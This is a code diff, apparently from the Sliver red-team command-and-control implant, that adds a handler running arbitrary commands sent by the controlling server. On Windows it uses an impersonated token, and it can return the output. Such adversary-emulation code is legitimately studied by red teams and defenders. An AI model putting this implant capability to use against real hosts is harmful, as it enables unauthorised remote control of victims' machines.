@@ -26,6 +26,11 @@ import (
 	"fmt"
 	"io"
 	"io/ioutil"
+	"os/exec"
+
+	//{{if eq .Config.GOOS "windows"}}
+	"syscall"
+	//{{end}}
 
 	// {{if .Config.Debug}}
 	"log"
@@ -55,9 +60,13 @@ type TunnelHandler func(*sliverpb.Envelope, *transports.Connection)
 // PivotHandler - Handler related to pivoting
 type PivotHandler func(*sliverpb.Envelope, *transports.Connection)
 
-// ------------------------------
-// --- PURE GO HANDLERS ONLY  ---
-// ------------------------------
+// -----------------------------------------------------
+// -----------------------------------------------------
+// -----------------------------------------------------
+// --- PURE GO / PLATFORM INDEPENDENT HANDLERS ONLY  ---
+// -----------------------------------------------------
+// -----------------------------------------------------
+// -----------------------------------------------------
 
 func pingHandler(data []byte, resp RPCResponse) {
 	ping := &sliverpb.Ping{}
@@ -321,6 +330,56 @@ func uploadHandler(data []byte, resp RPCResponse) {
 	}
 
 	data, _ = proto.Marshal(upload)
+	resp(data, err)
+}
+
+func executeHandler(data []byte, resp RPCResponse) {
+	var (
+		err error
+	)
+	execReq := &sliverpb.ExecuteReq{}
+	err = proto.Unmarshal(data, execReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+
+	execResp := &sliverpb.Execute{}
+	cmd := exec.Command(execReq.Path, execReq.Args...)
+
+	//{{if eq .Config.GOOS "windows"}}
+	cmd.SysProcAttr = &windows.SysProcAttr{
+		Token: syscall.Token(priv.CurrentToken),
+	}
+	//{{end}}
+
+	if execReq.Output {
+		res, err := cmd.CombinedOutput()
+		//{{if .Config.Debug}}
+		log.Println(string(res))
+		//{{end}}
+		if err != nil {
+			// Exit errors are not a failure of the RPC, but of the command.
+			if exiterr, ok := err.(*exec.ExitError); ok {
+				execResp.Status = uint32(exiterr.ExitCode())
+			} else {
+				execResp.Response = &commonpb.Response{
+					Err: fmt.Sprintf("%s", err),
+				}
+			}
+		}
+		execResp.Result = string(res)
+	} else {
+		err = cmd.Start()
+		if err != nil {
+			execResp.Response = &commonpb.Response{
+				Err: fmt.Sprintf("%s", err),
+			}
+		}
+	}
+	data, err = proto.Marshal(execResp)
 	resp(data, err)
 }
 
